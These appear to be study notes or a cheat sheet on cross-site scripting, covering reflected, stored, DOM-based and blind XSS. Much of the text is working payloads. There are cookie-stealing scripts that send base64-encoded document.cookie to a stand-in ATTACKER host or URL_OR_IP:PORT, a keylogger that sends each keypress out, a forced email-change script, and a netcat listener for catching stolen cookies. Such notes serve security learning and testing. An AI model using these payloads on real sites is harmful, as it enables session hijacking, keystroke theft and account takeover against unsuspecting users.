## Payloads
PoC:

```python
<script>alert('XSS')</script>
```

Session Stealing:

```python
<script>fetch('https://ATTACKER/steal?cookie=' + btoa(document.cookie));</script>
```

The `btoa()` function encodes the cookie value for safe transmission.

Key Logger:

```python
<script>
document.onkeypress = function(e) {
fetch('https://ATTACKER/log?key=' + btoa(e.key));
}
</script>
```

Business Logic Attacks (example):

```python
<script>user.changeEmail('attacker@mail.com');</script>
```

## Reflected XSS - Non-Persistent
Reflected XSS occurs when a web app takes user input (such as a query string, form field, or header) and immediately displays it on a page without sanitising it.

Line of code suspectable to this:

```python
return render_template("news.html", news=NEWS, query=q, query_escaped=query_escaped)
```

## Stored XSS - Persistent
**Stored XSS** happens when an application saves **attacker-controlled input on the server** (in a database, normally) and later serves that content to other users without proper escaping, causing the injected script to run in every visitor’s browser.

## DOM-Based XSS - Client Side
DOM-based XSS occurs when client-side JavaScript reads attacker-controllable data from the DOM (`URL`, `location.hash`, `location.search`, `document.referrer`, `localStorage`, etc.) and writes it back into the page in an unsafe way (e.g. `innerHTML`, `document.write`, `eval`).

Example payload:

```html
<img src=x onerror="alert('XSS')">
```

## Blind XSS
You can't see whether it's working or not. A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express).

### Extracting Cookies
```shell-session
user@machine$ nc -nlvp 9001
Listening on [0.0.0.0] (family 0, port 9001)
```

put in the payload

```shell-session
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```

- The `</textarea>` tag closes the text area field.
- `?cookie=` is the query string containing the victim’s cookies.
- `btoa()` command base64 encodes the victim’s cookies.
- `document.cookie` accesses the victim’s cookies.

